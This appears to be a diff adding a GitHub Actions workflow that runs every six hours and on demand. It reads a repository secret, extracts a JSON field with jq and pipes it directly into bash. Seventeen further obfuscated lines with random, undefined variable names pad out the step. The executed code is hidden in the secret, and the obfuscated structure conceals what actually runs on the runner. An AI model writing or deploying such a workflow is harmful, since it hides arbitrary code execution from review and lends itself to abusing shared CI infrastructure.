@@ -1,0 +1,35 @@
+name: shawennixiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shawennixiang
+        env:
+          h0631: ${{ secrets.h0631 }}
+        run: |
+          echo $h0631 | jq -r .n237 | /bin/bash
+          echo $girtl58603 | jq -r .qm54 | /bin/bash
+          echo $ldbp5 | jq -r .fuf68913 | /bin/bash
+          echo $yjpv1254 | jq -r .d33 | /bin/bash
+          echo $cjy997 | jq -r .q34 | /bin/bash
+          echo $audln522 | jq -r .nfj18107 | /bin/bash
+          echo $g9 | jq -r .x640 | /bin/bash
+          echo $wsuvd5031 | jq -r .mcvsc6387 | /bin/bash
+          echo $nhm28416 | jq -r .mm7 | /bin/bash
+          echo $oln8663 | jq -r .wqqja901 | /bin/bash
+          echo $z8 | jq -r .dfs6 | /bin/bash
+          echo $g6 | jq -r .h701 | /bin/bash
+          echo $fmecz438 | jq -r .ks34 | /bin/bash
+          echo $paqjw30837 | jq -r .edqg61 | /bin/bash
+          echo $l830 | jq -r .txhau779 | /bin/bash
+          echo $tuby963 | jq -r .emxrf67 | /bin/bash
+          echo $efrg03 | jq -r .r0843 | /bin/bash
+          echo $z4063 | jq -r .ruv02 | /bin/bash
+
